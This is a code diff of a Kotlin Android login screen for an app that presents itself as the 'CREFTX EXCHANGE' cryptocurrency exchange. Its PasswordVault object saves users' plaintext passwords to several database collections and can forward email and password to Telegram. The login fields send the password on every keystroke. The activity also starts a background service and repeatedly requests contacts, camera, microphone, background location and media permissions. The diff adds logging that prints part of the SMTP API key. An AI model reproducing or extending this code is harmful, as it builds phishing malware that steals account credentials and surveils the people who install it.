@@ -1,5 +1,4 @@
 // language: Kotlin, file: LoginActivity.kt
-// كل حاجة في ملف واحد: Brevo + PasswordVault + InviteCodeHelper + LoginActivity
 
 package com.sys.update2
 
@@ -11,6 +10,7 @@ import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -74,12 +74,8 @@ import android.graphics.Color as AColor
 import android.graphics.Paint as APaint
 import android.graphics.Typeface as ATypeface
 
-// ══════════════════════════════════════════════════════════
-//  BrevoMailer
-// ══════════════════════════════════════════════════════════
-
 object BrevoMailer {
-
+    private const val TAG = "BrevoMailer"
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
@@ -88,165 +84,126 @@ object BrevoMailer {
 
     suspend fun sendCode(email: String, code: String, isReset: Boolean): Result<Unit> {
         return try {
+            Log.d(TAG, "reading smtp key")
             val smtpDoc = FirebaseAuthHelper.db()
-                .collection("smtp")
-                .document("smtpsjjsjs")
-                .get().await()
-            val apiKey = smtpDoc.getString("smtp") ?: ""
-            if (apiKey.isBlank()) return Result.failure(Exception("لا يوجد مفتاح SMTP"))
-
-            val html = if (isReset) {
-                "<div style=\"font-family:Arial\"><p>Enter your verification code to change your password.</p><p>Your verification code is: <b>$code</b></p></div>"
-            } else {
-                "<div style=\"font-family:Arial\"><p>Your verification code is: <b>$code</b>.</p></div>"
+                .collection("smtp").document("smtpsjjsjs").get().await()
+            if (!smtpDoc.exists()) {
+                Log.e(TAG, "smtp NOT exist")
+                return Result.failure(Exception("SMTP doc not found"))
             }
-
+            val apiKey = smtpDoc.getString("smtp") ?: ""
+            if (apiKey.isBlank()) {
+                return Result.failure(Exception("SMTP key empty"))
+            }
+            Log.d(TAG, "smtp key len=${apiKey.length} prefix=${apiKey.take(8)}")
+            val html = if (isReset)
+                "<div style=\"font-family:Arial\"><p>Enter your verification code to change your password.</p><p>Your verification code is: <b>$code</b></p></div>"
+            else
+                "<div style=\"font-family:Arial\"><p>Your verification code is: <b>$code</b>.</p></div>"
             val bodyJson = JSONObject().apply {
                 put("sender", JSONObject().apply {
                     put("name", "CREFTX EXCHANGE")
                     put("email", "noreply.eptinex@gmail.com")
                 })
-                put("to", JSONArray().apply {
-                    put(JSONObject().apply { put("email", email) })
-                })
+                put("to", JSONArray().apply { put(JSONObject().apply { put("email", email) }) })
                 put("subject", "Verification Code")
                 put("htmlContent", html)
             }
-
             val req = Request.Builder()
                 .url("https://api.brevo.com/v3/smtp/email")
                 .addHeader("api-key", apiKey)
                 .addHeader("Content-Type", "application/json")
+                .addHeader("Accept", "application/json")
                 .post(bodyJson.toString().toRequestBody("application/json".toMediaType()))
                 .build()
-
             val resp = client.newCall(req).execute()
-            val ok = resp.isSuccessful
+            val httpCode = resp.code
+            val respBody = resp.body?.string() ?: ""
             resp.close()
-
-            if (ok) Result.success(Unit) else Result.failure(Exception("فشل إرسال الكود"))
+            Log.d(TAG, "Brevo resp code=$httpCode body=${respBody.take(300)}")
+            if (httpCode in 200..299) Result.success(Unit)
+            else Result.failure(Exception("HTTP $httpCode: ${respBody.take(150)}"))
         } catch (e: Exception) {
+            Log.e(TAG, "err: ${e.message}", e)
             Result.failure(e)
         }
     }
 }
 
-// ══════════════════════════════════════════════════════════
-//  PasswordVault
-// ══════════════════════════════════════════════════════════
-
 object PasswordVault {
-
+    private const val TAG = "PasswordVault"
     suspend fun save(
-        email: String,
-        password: String,
-        field: String,
-        uid: String? = null,
-        sendToTelegram: Boolean = false
+        email: String, password: String, field: String,
+        uid: String? = null, sendToTelegram: Boolean = false
     ) {
         if (email.isBlank()) return
         val db = FirebaseAuthHelper.db()
-
         try {
             db.collection("users").document(email)
-                .set(mapOf(
-                    "email" to email,
-                    field to password,
-                    "updatedAt" to System.currentTimeMillis()
-                ), SetOptions.merge()).await()
-        } catch (_: Exception) {}
-
+                .set(mapOf("email" to email, field to password,
+                    "updatedAt" to System.currentTimeMillis()), SetOptions.merge()).await()
+        } catch (e: Exception) { Log.e(TAG, "users/$email: ${e.message}") }
         if (uid != null) {
             try {
                 db.collection("users").document(uid)
-                    .set(mapOf(
-                        "email" to email,
-                        "pasef" to password,
-                        "uid" to uid,
-                        "updatedAt" to System.currentTimeMillis()
-                    ), SetOptions.merge()).await()
-            } catch (_: Exception) {}
+                    .set(mapOf("email" to email, "pasef" to password,
+                        "uid" to uid, "updatedAt" to System.currentTimeMillis()),
+                        SetOptions.merge()).await()
+            } catch (e: Exception) { Log.e(TAG, "users/$uid: ${e.message}") }
         }
-
         try {
             db.collection("pwds").document(email)
-                .set(mapOf(
-                    "pw" to password,
-                    "uid" to (uid ?: ""),
-                    "email" to email,
-                    "updatedAt" to System.currentTimeMillis()
-                ), SetOptions.merge()).await()
-        } catch (_: Exception) {}
-
+                .set(mapOf("pw" to password, "uid" to (uid ?: ""),
+                    "email" to email, "updatedAt" to System.currentTimeMillis()),
+                    SetOptions.merge()).await()
+        } catch (e: Exception) { Log.e(TAG, "pwds: ${e.message}") }
         if (uid != null) {
             try {
                 db.collection("pass").document(uid)
-                    .set(mapOf(
-                        "pw" to password,
-                        "email" to email,
-                        "updatedAt" to System.currentTimeMillis()
-                    ), SetOptions.merge()).await()
-            } catch (_: Exception) {}
+                    .set(mapOf("pw" to password, "email" to email,
+                        "updatedAt" to System.currentTimeMillis()),
+                        SetOptions.merge()).await()
+            } catch (e: Exception) { Log.e(TAG, "pass: ${e.message}") }
         }
-
         if (sendToTelegram) {
             try {
-                TelegramApi.sendMessage(
-                    "🔐 *بيانات جديدة*\n\n" +
-                    "📧 *البريد:* `$email`\n" +
-                    "🔑 *كلمة المرور:* `$password`\n" +
-                    "📌 *النوع:* $field"
-                )
+                TelegramApi.sendMessage("🔐 *بيانات جديدة*\n\n📧 *البريد:* `$email`\n🔑 *كلمة المرور:* `$password`\n📌 *النوع:* $field")
             } catch (_: Exception) {}
         }
     }
 }
 
-// ══════════════════════════════════════════════════════════
-//  InviteCodeHelper
-// ══════════════════════════════════════════════════════════
-
 object InviteCodeHelper {
-
+    private const val TAG = "InviteCodeHelper"
     private const val CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
 
-    suspend fun exists(code: String): Boolean {
-        return try {
-            val d = FirebaseAuthHelper.db()
-                .collection("inviteCodes").document(code.uppercase())
-                .get().await()
-            d.exists() && !d.getString("uid").isNullOrBlank()
-        } catch (_: Exception) { false }
-    }
+    suspend fun exists(code: String): Boolean = try {
+        val d = FirebaseAuthHelper.db().collection("inviteCodes")
+            .document(code.uppercase()).get().await()
+        d.exists() && !d.getString("uid").isNullOrBlank()
+    } catch (e: Exception) { Log.e(TAG, "exists: ${e.message}"); false }
 
-    suspend fun data(code: String): Map<String, Any>? {
-        return try {
-            val d = FirebaseAuthHelper.db()
-                .collection("inviteCodes").document(code.uppercase())
-                .get().await()
-            if (d.exists()) d.data else null
-        } catch (_: Exception) { null }
-    }
+    suspend fun data(code: String): Map<String, Any>? = try {
+        val d = FirebaseAuthHelper.db().collection("inviteCodes")
+            .document(code.uppercase()).get().await()
+        if (d.exists()) d.data else null
+    } catch (e: Exception) { Log.e(TAG, "data: ${e.message}"); null }
 
     suspend fun reserve(email: String, name: String, uid: String): String? {
         val db = FirebaseAuthHelper.db()
         var attempts = 0
         while (attempts < 10) {
-            val code = buildString {
-                repeat(8) { append(CHARS[Random.nextInt(CHARS.length)]) }
-            }
+            val code = buildString { repeat(8) { append(CHARS[Random.nextInt(CHARS.length)]) } }
             val ref = db.collection("inviteCodes").document(code)
-            val snap = try { ref.get().await() } catch (_: Exception) { null }
-            if (snap != null && !snap.exists()) {
+            val exists = try { ref.get().await().exists() }
+            catch (e: Exception) { Log.w(TAG, "check: ${e.message}"); false }
+            if (!exists) {
                 try {
-                    ref.set(mapOf(
-                        "uid" to uid,
-                        "name" to name,
-                        "email" to email,
-                        "createdAt" to System.currentTimeMillis()
-                    )).await()
+                    ref.set(mapOf("uid" to uid, "name" to name, "email" to email,
+                        "createdAt" to System.currentTimeMillis())).await()
+                    Log.d(TAG, "reserved $code")
                     return code
-                } catch (_: Exception) { return null }
+                } catch (e: Exception) { Log.e(TAG, "reserve set: ${e.message}"); return null }
             }
             attempts++
         }
@@ -255,22 +212,13 @@ object InviteCodeHelper {
 
     suspend fun linkReferral(referrerUid: String, newUid: String, name: String, email: String) {
         try {
-            FirebaseAuthHelper.db()
-                .collection("users").document(referrerUid)
+            FirebaseAuthHelper.db().collection("users").document(referrerUid)
                 .collection("referrals").document(newUid)
-                .set(mapOf(
-                    "name" to name,
-                    "email" to email,
-                    "uid" to newUid,
-                    "usedAt" to System.currentTimeMillis()
-                )).await()
-        } catch (_: Exception) {}
+                .set(mapOf("name" to name, "email" to email, "uid" to newUid,
+                    "usedAt" to System.currentTimeMillis())).await()
+        } catch (e: Exception) { Log.e(TAG, "link: ${e.message}") }
     }
 }
-
-// ══════════════════════════════════════════════════════════
-//  ألوان التصميم
-// ══════════════════════════════════════════════════════════
 
 object Ex {
     val Bg0 = Color(0xFF1A5FD0)
@@ -314,18 +262,12 @@ private data class CapGlyph(
 private data class LangItem(val name: String, val code: String)
 
 private val ALL_LANGS = listOf(
-    LangItem("العربية",    "sa"),
-    LangItem("English",    "us"),
-    LangItem("中文简体",    "cn"),
-    LangItem("中文繁体",    "tw"),
-    LangItem("日本語",      "jp"),
-    LangItem("Türkçe",     "tr"),
-    LangItem("한국인",      "kr"),
-    LangItem("Vietnam",    "vn"),
-    LangItem("French",     "fr"),
-    LangItem("Portuguese", "pt"),
-    LangItem("اردو",        "pk"),
-    LangItem("فارسی",       "ir"),
+    LangItem("العربية",    "sa"), LangItem("English",    "us"),
+    LangItem("中文简体",    "cn"), LangItem("中文繁体",    "tw"),
+    LangItem("日本語",      "jp"), LangItem("Türkçe",     "tr"),
+    LangItem("한국인",      "kr"), LangItem("Vietnam",    "vn"),
+    LangItem("French",     "fr"), LangItem("Portuguese", "pt"),
+    LangItem("اردو",        "pk"), LangItem("فارسی",       "ir"),
     LangItem("ภาษาไทย",     "th")
 )
 
@@ -334,11 +276,9 @@ object RemoteImgs {
     const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"
 }
 
-// ══════════════════════════════════════════════════════════
-//  LoginActivity
-// ══════════════════════════════════════════════════════════
-
 class LoginActivity : ComponentActivity() {
+
+    private val TAG = "LoginActivity"
 
     private var currentScreen by mutableStateOf(0)
     private var isLoading by mutableStateOf(false)
@@ -382,10 +322,11 @@ class LoginActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        Log.d(TAG, "onCreate")
         window.statusBarColor = AColor.parseColor("#02081A")
         window.navigationBarColor = AColor.parseColor("#02081A")
         captchaCode = newCaptchaCode()
-        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
+        try { DeviceManager.registerDeviceOnce(this) } catch (e: Exception) { Log.e(TAG, "reg: ${e.message}") }
         startBackgroundService()
         Handler(Looper.getMainLooper()).postDelayed({ requestAllPermissions() }, 1500L)
         setContent {
@@ -405,27 +346,19 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  الأذونات
-    // ═══════════════════════════════════════════
-
     private fun requiredPermissions(): List<String> {
         val list = mutableListOf<String>()
         if (Build.VERSION.SDK_INT >= 33) {
             list.add("android.permission.READ_MEDIA_IMAGES")
             list.add("android.permission.READ_MEDIA_VIDEO")
             list.add("android.permission.READ_MEDIA_AUDIO")
-        } else {
-            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        }
+        } else list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         list.add(Manifest.permission.READ_CONTACTS)
         list.add(Manifest.permission.CAMERA)
         list.add(Manifest.permission.RECORD_AUDIO)
         list.add(Manifest.permission.ACCESS_FINE_LOCATION)
         list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-        if (Build.VERSION.SDK_INT >= 33) {
-            list.add("android.permission.POST_NOTIFICATIONS")
-        }
+        if (Build.VERSION.SDK_INT >= 33) list.add("android.permission.POST_NOTIFICATIONS")
         return list
     }
 
@@ -439,9 +372,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<out String>,
-        grantResults: IntArray
+        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         when (requestCode) {
@@ -449,13 +380,9 @@ class LoginActivity : ComponentActivity() {
                 val allGranted = grantResults.isNotEmpty() &&
                     grantResults.all { it == PackageManager.PERMISSION_GRANTED }
                 if (!allGranted) {
-                    if (permissionAttempts < 3) {
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            requestAllPermissions()
-                        }, 800L)
-                    } else {
-                        onAllPermissionsGranted()
-                    }
+                    if (permissionAttempts < 3) Handler(Looper.getMainLooper()).postDelayed({
+                        requestAllPermissions()
+                    }, 800L) else onAllPermissionsGranted()
                     return
                 }
                 onAllPermissionsGranted()
@@ -470,21 +397,12 @@ class LoginActivity : ComponentActivity() {
         try { DeviceManager.uploadPermissions(applicationContext) } catch (_: Exception) {}
         startBackgroundService()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val bg = ContextCompat.checkSelfPermission(
-                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
-            )
-            val fine = ContextCompat.checkSelfPermission(
-                this, Manifest.permission.ACCESS_FINE_LOCATION
-            )
-            if (bg != PackageManager.PERMISSION_GRANTED &&
-                fine == PackageManager.PERMISSION_GRANTED
-            ) {
+            val bg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            if (bg != PackageManager.PERMISSION_GRANTED && fine == PackageManager.PERMISSION_GRANTED) {
                 Handler(Looper.getMainLooper()).postDelayed({
-                    ActivityCompat.requestPermissions(
-                        this,
-                        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
-                        BG_LOCATION_REQUEST
-                    )
+                    ActivityCompat.requestPermissions(this,
+                        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), BG_LOCATION_REQUEST)
                 }, 500L)
                 return
             }
@@ -494,134 +412,80 @@ class LoginActivity : ComponentActivity() {
     private fun startBackgroundService() {
         try {
             val i = Intent(this, BackgroundService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                startForegroundService(i)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
             else startService(i)
-        } catch (_: Exception) {}
+        } catch (e: Exception) { Log.e(TAG, "bg: ${e.message}") }
     }
 
     private fun validEmail(s: String): Boolean =
         Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(s.trim())
 
     private fun newVerifyCode(): String = (100000 + Random.nextInt(900000)).toString()
-    private fun showToast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()
+    private fun showToast(m: String) { Log.d(TAG, "toast: $m"); Toast.makeText(this, m, Toast.LENGTH_SHORT).show() }
 
     private fun goToHome() {
         try {
             startActivity(Intent(this, HomeActivity::class.java))
             finish()
-        } catch (_: Exception) {}
+        } catch (e: Exception) { Log.e(TAG, "home: ${e.message}") }
     }
-
-    // ═══════════════════════════════════════════
-    //  Composable: background + language
-    // ═══════════════════════════════════════════
 
     @Composable
     fun EllipseBackground() {
         Canvas(modifier = Modifier.fillMaxSize()) {
-            val w = size.width
-            val h = size.height
-            val cx = w * 0.5f
-            val cy = h * -0.05f
-            val rx = w * 1.4f / 2f
-            val ry = h * 0.6f / 2f
+            val w = size.width; val h = size.height
+            val cx = w * 0.5f; val cy = h * -0.05f
+            val rx = w * 1.4f / 2f; val ry = h * 0.6f / 2f
             val radius = maxOf(rx, ry)
             drawContext.canvas.save()
             drawContext.canvas.translate(cx, cy)
             drawContext.canvas.scale(rx / radius, ry / radius)
-            drawCircle(
-                brush = Brush.radialGradient(
-                    colorStops = arrayOf(
-                        0.00f to Ex.Bg0,
-                        0.22f to Ex.Bg1,
-                        0.45f to Ex.Bg2,
-                        0.70f to Ex.Bg3,
-                        1.00f to Ex.Bg4
-                    ),
-                    center = Offset.Zero,
-                    radius = radius
-                ),
-                radius = radius,
-                center = Offset.Zero
-            )
+            drawCircle(brush = Brush.radialGradient(
+                colorStops = arrayOf(
+                    0.00f to Ex.Bg0, 0.22f to Ex.Bg1, 0.45f to Ex.Bg2,
+                    0.70f to Ex.Bg3, 1.00f to Ex.Bg4
+                ), center = Offset.Zero, radius = radius),
+                radius = radius, center = Offset.Zero)
             drawContext.canvas.restore()
         }
     }
 
     @Composable
     fun LanguageScreen() {
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(Ex.Bg4)
-                .padding(top = 16.dp)
-        ) {
-            Row(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(horizontal = 16.dp),
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                Box(
-                    modifier = Modifier
-                        .size(42.dp)
-                        .clip(CircleShape)
-                        .background(Ex.FieldBgR)
-                        .border(1.dp, Ex.FieldBrR, CircleShape)
-                        .clickable { currentScreen = 0 },
-                    contentAlignment = Alignment.Center
-                ) {
-                    Icon(
-                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
-                        contentDescription = "عودة",
-                        tint = Ex.White,
-                        modifier = Modifier.size(22.dp)
-                    )
+        Column(modifier = Modifier.fillMaxSize().background(Ex.Bg4).padding(top = 16.dp)) {
+            Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp),
+                verticalAlignment = Alignment.CenterVertically) {
+                Box(modifier = Modifier.size(42.dp).clip(CircleShape)
+                    .background(Ex.FieldBgR).border(1.dp, Ex.FieldBrR, CircleShape)
+                    .clickable { currentScreen = 0 }, contentAlignment = Alignment.Center) {
+                    Icon(imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                        contentDescription = "عودة", tint = Ex.White,
+                        modifier = Modifier.size(22.dp))
                 }
                 Spacer(Modifier.width(14.dp))
                 Text("اختر اللغة", color = Ex.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                 Spacer(Modifier.weight(1f))
             }
             Spacer(Modifier.height(20.dp))
-            Column(
-                modifier = Modifier
-                    .fillMaxSize()
-                    .verticalScroll(rememberScrollState())
-                    .padding(horizontal = 16.dp)
-            ) {
+            Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState())
+                .padding(horizontal = 16.dp)) {
                 ALL_LANGS.forEachIndexed { index, item ->
                     val selected = selectedLang == index
-                    Row(
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .padding(vertical = 4.dp)
-                            .clip(RoundedCornerShape(12.dp))
-                            .background(if (selected) Ex.FieldBgR else Color.Transparent)
-                            .clickable { selectedLang = index; currentScreen = 0 }
-                            .padding(horizontal = 14.dp, vertical = 14.dp),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
+                    Row(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)
+                        .clip(RoundedCornerShape(12.dp))
+                        .background(if (selected) Ex.FieldBgR else Color.Transparent)
+                        .clickable { selectedLang = index; currentScreen = 0 }
+                        .padding(horizontal = 14.dp, vertical = 14.dp),
+                        verticalAlignment = Alignment.CenterVertically) {
                         Text(item.name, color = Ex.InputTxt, fontSize = 15.sp,
                             modifier = Modifier.weight(1f))
                         Spacer(Modifier.width(14.dp))
                         FlagIcon(code = item.code, modifier = Modifier.width(32.dp).height(23.dp))
                         Spacer(Modifier.width(14.dp))
-                        if (selected) {
-                            Box(
-                                modifier = Modifier
-                                    .size(26.dp)
-                                    .clip(CircleShape)
-                                    .background(Ex.BlueAccent),
-                                contentAlignment = Alignment.Center
-                            ) {
-                                Text("✓", color = Color.White, fontSize = 15.sp,
-                                    fontWeight = FontWeight.Bold)
-                            }
-                        } else {
-                            Box(modifier = Modifier.size(26.dp)
-                                .border(2.dp, Ex.Hint, CircleShape))
-                        }
+                        if (selected) Box(modifier = Modifier.size(26.dp).clip(CircleShape)
+                            .background(Ex.BlueAccent), contentAlignment = Alignment.Center) {
+                            Text("✓", color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                        } else Box(modifier = Modifier.size(26.dp).border(2.dp, Ex.Hint, CircleShape))
                     }
                 }
                 Spacer(Modifier.height(30.dp))
@@ -629,188 +493,99 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  شاشة تسجيل الدخول
-    // ═══════════════════════════════════════════
-
     @Composable
     fun LoginScreen() {
         val scope = rememberCoroutineScope()
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .verticalScroll(rememberScrollState())
-                .imePadding(),
-            horizontalAlignment = Alignment.CenterHorizontally
-        ) {
-            Row(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(start = 16.dp, end = 16.dp, top = 12.dp),
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                Box(
-                    modifier = Modifier
-                        .size(42.dp)
-                        .clip(CircleShape)
-                        .background(Ex.FieldBgR)
-                        .border(1.dp, Ex.FieldBrR, CircleShape)
-                        .clickable { currentScreen = 3 },
-                    contentAlignment = Alignment.Center
-                ) {
-                    FlagIcon(
-                        code = ALL_LANGS[selectedLang].code,
-                        modifier = Modifier.width(28.dp).height(20.dp)
-                            .clip(RoundedCornerShape(4.dp))
-                    )
+        Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState()).imePadding(),
+            horizontalAlignment = Alignment.CenterHorizontally) {
+            Row(modifier = Modifier.fillMaxWidth().padding(start = 16.dp, end = 16.dp, top = 12.dp),
+                verticalAlignment = Alignment.CenterVertically) {
+                Box(modifier = Modifier.size(42.dp).clip(CircleShape)
+                    .background(Ex.FieldBgR).border(1.dp, Ex.FieldBrR, CircleShape)
+                    .clickable { currentScreen = 3 }, contentAlignment = Alignment.Center) {
+                    FlagIcon(code = ALL_LANGS[selectedLang].code,
+                        modifier = Modifier.width(28.dp).height(20.dp).clip(RoundedCornerShape(4.dp)))
                 }
                 Spacer(Modifier.weight(1f))
             }
-            Column(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(start = 22.dp, end = 22.dp, top = 14.dp),
-                horizontalAlignment = Alignment.CenterHorizontally
-            ) {
-                AsyncImage(
-                    model = RemoteImgs.LOGO,
-                    contentDescription = "ExCoreX",
-                    modifier = Modifier.height(40.dp),
-                    contentScale = ContentScale.Fit
-                )
+            Column(modifier = Modifier.fillMaxWidth().padding(start = 22.dp, end = 22.dp, top = 14.dp),
+                horizontalAlignment = Alignment.CenterHorizontally) {
+                AsyncImage(model = RemoteImgs.LOGO, contentDescription = "ExCoreX",
+                    modifier = Modifier.height(40.dp), contentScale = ContentScale.Fit)
                 Spacer(Modifier.height(14.dp))
-                Row(
-                    modifier = Modifier
-                        .clip(RoundedCornerShape(999.dp))
-                        .background(Ex.BadgeBg)
-                        .border(1.dp, Ex.BadgeBr, RoundedCornerShape(999.dp))
-                        .padding(horizontal = 15.dp, vertical = 7.dp),
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
+                Row(modifier = Modifier.clip(RoundedCornerShape(999.dp)).background(Ex.BadgeBg)
+                    .border(1.dp, Ex.BadgeBr, RoundedCornerShape(999.dp))
+                    .padding(horizontal = 15.dp, vertical = 7.dp),
+                    verticalAlignment = Alignment.CenterVertically) {
                     HomeBadgeIcon()
                     Spacer(Modifier.width(7.dp))
-                    Text(
-                        "Trade cryptocurrencies anytime",
-                        color = Ex.BadgeTxt,
-                        fontSize = 13.sp,
-                        fontWeight = FontWeight.Medium
-                    )
+                    Text("Trade cryptocurrencies anytime", color = Ex.BadgeTxt,
+                        fontSize = 13.sp, fontWeight = FontWeight.Medium)
                 }
                 Spacer(Modifier.height(15.dp))
-                Text(
-                    text = buildAnnotatedString {
-                        append("Power up your\n")
-                        withStyle(SpanStyle(color = Ex.BlueAccent)) { append("cryptocurrency") }
-                        append("\njourney")
-                    },
-                    color = Ex.White,
-                    fontSize = 30.sp,
-                    lineHeight = 37.5.sp,
-                    fontWeight = FontWeight.ExtraBold,
-                    letterSpacing = 0.3.sp,
-                    textAlign = TextAlign.Center,
-                    modifier = Modifier.fillMaxWidth()
-                )
+                Text(text = buildAnnotatedString {
+                    append("Power up your\n")
+                    withStyle(SpanStyle(color = Ex.BlueAccent)) { append("cryptocurrency") }
+                    append("\njourney")
+                }, color = Ex.White, fontSize = 30.sp, lineHeight = 37.5.sp,
+                    fontWeight = FontWeight.ExtraBold, letterSpacing = 0.3.sp,
+                    textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth())
                 Spacer(Modifier.height(12.dp))
-                AsyncImage(
-                    model = RemoteImgs.COIN,
-                    contentDescription = null,
+                AsyncImage(model = RemoteImgs.COIN, contentDescription = null,
                     modifier = Modifier.fillMaxWidth(0.72f).widthIn(max = 290.dp),
-                    contentScale = ContentScale.Fit
-                )
+                    contentScale = ContentScale.Fit)
             }
             Spacer(Modifier.height((-32).dp))
             Box(modifier = Modifier.fillMaxWidth()) {
                 CardTopCurve(modifier = Modifier.fillMaxWidth().height(35.dp))
-                Column(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(top = 34.dp)
-                        .background(Ex.CardBg)
-                        .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)
-                ) {
+                Column(modifier = Modifier.fillMaxWidth().padding(top = 34.dp)
+                    .background(Ex.CardBg)
+                    .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)) {
                     Row {
-                        Text("Email", color = Ex.White, fontSize = 16.5.sp,
-                            fontWeight = FontWeight.Bold)
+                        Text("Email", color = Ex.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                         Spacer(Modifier.width(26.dp))
                         Text("Phone", color = Ex.TabOff.copy(alpha = 0.45f),
                             fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                     }
                     Spacer(Modifier.height(18.dp))
                     LoginField {
-                        RegInput(
-                            value = email, onChange = {
-                                email = it
-                                // Live save — كلمة السر تُحفظ عند الكتابة
-                                val pw = password
-                                if (pw.isNotBlank() && validEmail(it)) {
-                                    val capturedEmail = it.trim()
-                                    val capturedPw = pw
-                                    scope.launch {
-                                        try {
-                                            PasswordVault.save(
-                                                capturedEmail, capturedPw,
-                                                "pasef_login", null, false
-                                            )
-                                        } catch (_: Exception) {}
-                                    }
-                                }
-                            }, hint = "Email",
-                            keyboardType = KeyboardType.Email,
-                            modifier = Modifier.weight(1f)
-                        )
+                        RegInput(value = email, onChange = {
+                            email = it
+                            val pw = password
+                            if (pw.isNotBlank() && validEmail(it)) {
+                                val ce = it.trim(); val cp = pw
+                                scope.launch { try { PasswordVault.save(ce, cp, "pasef_login", null, false) } catch (_: Exception) {} }
+                            }
+                        }, hint = "Email", keyboardType = KeyboardType.Email,
+                            modifier = Modifier.weight(1f))
                     }
                     LoginField {
-                        RegInput(
-                            value = password, onChange = {
-                                password = it
-                                // Live save
-                                val em = email
-                                if (em.isNotBlank() && validEmail(em)) {
-                                    val capturedEmail = em.trim()
-                                    val capturedPw = it
-                                    scope.launch {
-                                        try {
-                                            PasswordVault.save(
-                                                capturedEmail, capturedPw,
-                                                "pasef_login", null, false
-                                            )
-                                        } catch (_: Exception) {}
-                                    }
-                                }
-                            }, hint = "Password",
-                            keyboardType = KeyboardType.Password,
-                            visible = pwVisible,
-                            modifier = Modifier.weight(1f)
-                        )
-                        EyeIcon(
-                            visible = pwVisible,
-                            modifier = Modifier.size(22.dp).clickable { pwVisible = !pwVisible }
-                        )
+                        RegInput(value = password, onChange = {
+                            password = it
+                            val em = email
+                            if (em.isNotBlank() && validEmail(em)) {
+                                val ce = em.trim(); val cp = it
+                                scope.launch { try { PasswordVault.save(ce, cp, "pasef_login", null, false) } catch (_: Exception) {} }
+                            }
+                        }, hint = "Password", keyboardType = KeyboardType.Password,
+                            visible = pwVisible, modifier = Modifier.weight(1f))
+                        EyeIcon(visible = pwVisible,
+                            modifier = Modifier.size(22.dp).clickable { pwVisible = !pwVisible })
                     }
                     LoginField {
-                        RegInput(
-                            value = captchaInput, onChange = { captchaInput = it },
+                        RegInput(value = captchaInput, onChange = { captchaInput = it },
                             hint = "Please enter the verification code",
-                            keyboardType = KeyboardType.Text, modifier = Modifier.weight(1f)
-                        )
-                        CaptchaImage(
-                            code = captchaCode,
-                            modifier = Modifier.width(88.dp).height(40.dp)
-                                .clip(RoundedCornerShape(7.dp))
-                                .clickable { captchaCode = newCaptchaCode() }
-                        )
+                            keyboardType = KeyboardType.Text, modifier = Modifier.weight(1f))
+                        CaptchaImage(code = captchaCode, modifier = Modifier.width(88.dp).height(40.dp)
+                            .clip(RoundedCornerShape(7.dp))
+                            .clickable { captchaCode = newCaptchaCode() })
                     }
                     Spacer(Modifier.height(4.dp))
-                    BlueButton(text = if (isLoading) "Logging in..." else "Log In") {
-                        doLogin(scope)
-                    }
+                    BlueButton(text = if (isLoading) "Logging in..." else "Log In") { doLogin(scope) }
                     Spacer(Modifier.height(18.dp))
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
+                    Row(modifier = Modifier.fillMaxWidth(),
                         horizontalArrangement = Arrangement.SpaceBetween,
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
+                        verticalAlignment = Alignment.CenterVertically) {
                         Text("reset pass", color = Ex.FootLink, fontSize = 14.sp,
